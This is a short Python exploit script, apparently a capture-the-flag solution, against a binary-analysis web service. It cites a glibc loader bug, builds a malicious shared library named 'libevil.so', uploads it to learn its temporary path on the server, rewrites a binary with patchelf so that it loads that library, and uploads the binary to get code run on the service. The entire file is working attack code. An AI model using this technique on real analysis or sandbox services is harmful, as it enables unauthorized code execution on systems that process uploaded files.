"""
https://sourceware.org/bugzilla/show_bug.cgi?id=22851

compile a lib
upload lib
get lib path from output

compile binary that uses lib
upload binary
"""

import requests
import subprocess


subprocess.run(['make', 'clean'], check=True)
subprocess.run(['make', 'evil'], check=True)


s = requests.Session()

r = s.get('http://jiaware-1.play.hfsc.tf:12345')
url = 'http://jiaware-1.play.hfsc.tf:12345/analyze'

with s.post(url, files={'file': open('libevil.so', 'rb')}, stream=True) as r:
    for line in r.iter_lines():
        print(line)
        if b'/tmp/' in line:
            lib_path = line[line.index(b'/tmp'):line.rfind(b':')].decode()
            break
print('path', lib_path)

subprocess.run(['patchelf', '--replace-needed', 'libevil.so', lib_path, 'main'], check=True)

r = s.post(url, files={'file': open('main', 'rb')})
print(r.text)
